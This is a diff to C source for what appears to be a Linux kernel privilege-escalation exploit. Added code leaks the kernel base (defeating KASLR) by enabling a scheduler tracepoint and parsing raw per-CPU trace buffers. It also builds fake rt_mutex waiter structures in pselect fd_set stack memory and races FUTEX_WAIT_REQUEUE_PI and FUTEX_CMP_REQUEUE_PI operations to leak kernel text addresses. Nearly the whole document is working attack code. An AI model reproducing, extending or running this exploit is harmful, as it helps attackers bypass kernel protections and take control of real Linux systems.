@@ -1,12 +1,20 @@
 #include "common.h"
 
+#ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
+#endif
 #define SLIDE_CONSUME_DELAY 2000
 #define SLIDE_CONSUME_USEC 0
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
 #define SLIDE_PSELECT_WORD_SHIFT 0
-#define SLIDE_WAIT_SECONDS 30
+#define SLIDE_WAIT_SECONDS 1
+
+#ifdef SLIDE_P0_OFFSET_CANDIDATES
+static const uintptr_t slide_p0_offsets[] = {
+  SLIDE_P0_OFFSET_CANDIDATES
+};
+#endif
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
@@ -25,6 +33,138 @@ static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
+
+#ifdef SLIDE_TRACEFS_WORKER_CALLER_OFF
+#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
+#define SLIDE_TRACEFS_EVENT_ID 109
+
+static int slide_tracefs_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  close(fd);
+  return wrote == (ssize_t)len;
+}
+
+static uintptr_t slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len) {
+  if (page_len < 20) {
+    return 0;
+  }
+
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) {
+    end = page_len;
+  }
+
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t event_header = 0;
+    memcpy(&event_header, page + pos, sizeof(event_header));
+    uint32_t type_len = event_header & 0x1fU;
+    if (type_len == 30) {
+      pos += 8;
+      continue;
+    }
+    if (type_len == 31) {
+      pos += 12;
+      continue;
+    }
+    if (type_len == 0 || type_len >= 29) {
+      break;
+    }
+
+    size_t record_len = (size_t)type_len * 4;
+    size_t record = pos + 4;
+    if (record + record_len > end) {
+      break;
+    }
+    uint16_t event_id = 0;
+    memcpy(&event_id, page + record, sizeof(event_id));
+    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
+      uint64_t caller = 0;
+      memcpy(&caller, page + record + 16, sizeof(caller));
+      uint64_t link_caller =
+          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
+      if (caller >= link_caller) {
+        uint64_t candidate = caller - link_caller;
+        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
+                     (unsigned long long)caller,
+                     (unsigned long long)candidate);
+          return (uintptr_t)candidate;
+        }
+      }
+    }
+    pos = record + record_len;
+  }
+  return 0;
+}
+
+static int slide_tracefs_leak_kernel_base(void) {
+  static const char tracing_on[] =
+      SLIDE_TRACEFS_ROOT "/tracing_on";
+  static const char trace[] =
+      SLIDE_TRACEFS_ROOT "/trace";
+  static const char event_enable[] =
+      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+
+  if (!slide_tracefs_write(tracing_on, "0") ||
+      !slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_error("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd >= 0) {
+    close(trace_fd);
+  }
+  sleep(1);
+  slide_tracefs_write(tracing_on, "0");
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t candidate = 0;
+  for (int cpu = 0; cpu < cpu_count && !candidate; cpu++) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (fd < 0) {
+      continue;
+    }
+    unsigned char page[4096];
+    ssize_t got;
+    while ((got = read(fd, page, sizeof(page))) > 0) {
+      candidate = slide_tracefs_parse_page(page, (size_t)got);
+      if (candidate) {
+        break;
+      }
+    }
+    close(fd);
+  }
+  slide_tracefs_write(event_enable, "0");
+  if (!candidate) {
+    pr_error("slide tracefs worker caller not found\n");
+    return 0;
+  }
+
+  slide_p0_offset = candidate;
+  kaslr_base = KIMAGE_TEXT_BASE + candidate;
+  kaslr_slide = candidate;
+  kaslr_done = 1;
+  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
+             "slide=%016llx p0_offset=%08zx\n",
+             getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide, slide_p0_offset);
+  return 1;
+}
+#endif
 
 int slide_pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
@@ -105,18 +245,22 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     uint64_t value;
     const char *name;
   } words[] = {
-    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
+    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
-    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
-    {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1, "pi0"},
+    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
+    {3, SLIDE_FAKE_WAITER_PRIO, "tree_prio"},
+    {5, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi0"},
     {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
-    {8, FAKE_WAITER_PRIO, "pi_prio"},
+    {7, SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset, "pi2"},
+    {8, SLIDE_FAKE_WAITER_PRIO, "pi_prio"},
     {9, 0, "pi_deadline"},
-    {10, SLIDE_INIT_TASK, "task"},
+#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
+    {10, fake_task, "task"},
+#else
+    {10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
+#endif
     {11, fake_lock, "lock"},
-    {12, 3, "wake_state"},
+    {12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
     {13, 0, "ww_ctx"},
   };
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
@@ -137,7 +281,7 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
 }
 
 void slide_pselect_stack_copy(void) {
-  if (!page_base || !fake_lock || !fake_w0) {
+  if (!fake_lock) {
     pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
              page_base, fake_lock, fake_w0);
     return;
@@ -183,16 +327,29 @@ void slide_pselect_stack_copy(void) {
     .tv_nsec = 0,
   };
   struct timespec *timeoutp = &timeout;
+  struct timespec started;
+  struct timespec finished;
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
 
   atomic_store(&slide_consume_go, 1);
   errno = 0;
 
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
+  int sched_done_at_return = atomic_load(&slide_consume_stop);
   atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &finished));
+  long elapsed_usec = (finished.tv_sec - started.tv_sec) * 1000000L +
+                      (finished.tv_nsec - started.tv_nsec) / 1000L;
+  pr_info("slide pselect returned ret=%d errno=%d elapsed_usec=%ld "
+          "seen=%d lost=%d entered=%d calls=%d done_at_return=%d sched_ok=%d "
           "last_sched_ret=%d last_sched_errno=%d\n",
-          ret, saved_errno, atomic_load(&slide_consume_calls),
+          ret, saved_errno, elapsed_usec,
+          atomic_load(&slide_consume_seen),
+          atomic_load(&slide_consume_lost),
+          atomic_load(&slide_consume_enter_sched),
+          atomic_load(&slide_consume_calls),
+          sched_done_at_return,
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
@@ -280,9 +437,17 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += SLIDE_WAIT_SECONDS;
 
   atomic_store(&slide_waiter_waiting, 1);
-  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-           &slide_f_pi_target, 0);
-  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  errno = 0;
+  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
+                           &timeout, &slide_f_pi_target, 0);
+  int wait_errno = errno;
+  errno = 0;
+  long unlock_ret = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0,
+                             NULL, NULL, 0);
+  int unlock_errno = errno;
+  pr_info("slide wait_requeue_pi ret=%ld errno=%d unlock_ret=%ld "
+          "unlock_errno=%d\n",
+          wait_ret, wait_errno, unlock_ret, unlock_errno);
 
   slide_pselect_stack_copy();
   atomic_store(&slide_route_done, 1);
@@ -372,6 +537,14 @@ uint64_t slide_read_stext(void) {
 
   uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
   uint64_t stext = leaked - off;
+#ifdef SLIDE_P0_OFFSET_CANDIDATES
+  if (stext - KIMAGE_TEXT_BASE != slide_p0_offset) {
+    pr_warning("slide stale boot_id candidate=%08zx leaked_slide=%08llx\n",
+               slide_p0_offset,
+               (unsigned long long)(stext - KIMAGE_TEXT_BASE));
+    return 0;
+  }
+#endif
   pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
   pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
@@ -392,10 +565,18 @@ uint64_t slide_child_leak_stext(void) {
   }
 
   errno = 0;
-  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-           &slide_f_pi_target, 0);
+  long requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
+                              (void *)1, &slide_f_pi_target, 0);
+  int requeue_errno = errno;
+  pr_info("slide cmp_requeue_pi ret=%ld errno=%d\n",
+          requeue_ret, requeue_errno);
 
-  while (!atomic_load(&slide_route_done)) {
+  for (int waited = 0; !atomic_load(&slide_route_done); waited++) {
+    if (waited == SLIDE_WAIT_SECONDS + 10) {
+      pr_warning("slide route timed out after %d seconds\n",
+                 SLIDE_WAIT_SECONDS + 10);
+      return 0;
+    }
     sleep(1);
   }
 
@@ -403,11 +584,77 @@ uint64_t slide_child_leak_stext(void) {
 }
 
 int slide_leak_kernel_base(void) {
-  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
+  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
+  uintptr_t forced_offset = 0;
+  int forced = forced_offset_arg && *forced_offset_arg;
+  if (forced) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
+    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
+        (value & 0xffffULL) != 0) {
+      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
+      return 0;
+    }
+    forced_offset = (uintptr_t)value;
+    pr_info("slide forced p0 offset=%08zx\n", forced_offset);
+  }
+
+#ifdef SLIDE_TRACEFS_WORKER_CALLER_OFF
+  if (forced) {
+    slide_p0_offset = forced_offset;
+    kaslr_base = KIMAGE_TEXT_BASE + forced_offset;
+    kaslr_slide = forced_offset;
+    kaslr_done = 1;
+    pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
+               "slide=%016llx p0_offset=%08zx\n",
+               getpid(), (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide, slide_p0_offset);
+    return 1;
+  }
+  return slide_tracefs_leak_kernel_base();
+#endif
+
+  int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
+  for (int attempt = 1; attempt <= max_attempts; attempt++) {
+    if (forced) {
+      slide_p0_offset = forced_offset;
+    } else {
+#ifdef SLIDE_P0_OFFSET_CANDIDATES
+      slide_p0_offset = slide_p0_offsets[
+          (size_t)(attempt - 1) %
+          (sizeof(slide_p0_offsets) / sizeof(slide_p0_offsets[0]))];
+#else
+      slide_p0_offset = 0;
+#endif
+    }
+#ifdef SLIDE_STATIC_ZERO_LOCK_BASE
+    page_base = SLIDE_STATIC_ZERO_LOCK_BASE;
+    fake_lock = page_base + SLIDE_STATIC_ZERO_LOCK_OFFSET +
+                (uintptr_t)(attempt - 1) * SLIDE_STATIC_ZERO_LOCK_STRIDE;
+    fake_w0 = 0;
+    fake_task = SLIDE_WAITER_TASK;
+    pr_info("slide static zero lock attempt=%d page=%016zx lock=%016zx "
+            "p0_offset=%08zx owner=0000000000000000 wake_task=%016zx "
+            "logger_parent=%016llx "
+            "bootid_target=%016llx\n",
+            attempt, page_base, fake_lock, slide_p0_offset, fake_task,
+            (unsigned long long)(SLIDE_LOGGERS_0_1 + slide_p0_offset),
+            (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset));
+#else
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
       continue;
     }
+    pr_info("slide payload page=%016zx lock=%016zx w0=%016zx task=%016zx "
+            "p0_offset=%08zx owner=%016zx top_prio=%u logger_parent=%016llx "
+            "bootid_target=%016llx\n",
+            page_base, fake_lock, fake_w0, fake_task, slide_p0_offset,
+            (size_t)SLIDE_LOCK_OWNER_VALUE,
+            (unsigned int)SLIDE_FAKE_WAITER_PRIO,
+            (unsigned long long)(SLIDE_LOGGERS_0_1 + slide_p0_offset),
+            (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset));
+#endif
 
     int raw_fds[2];
     SYSCHK(pipe(raw_fds));
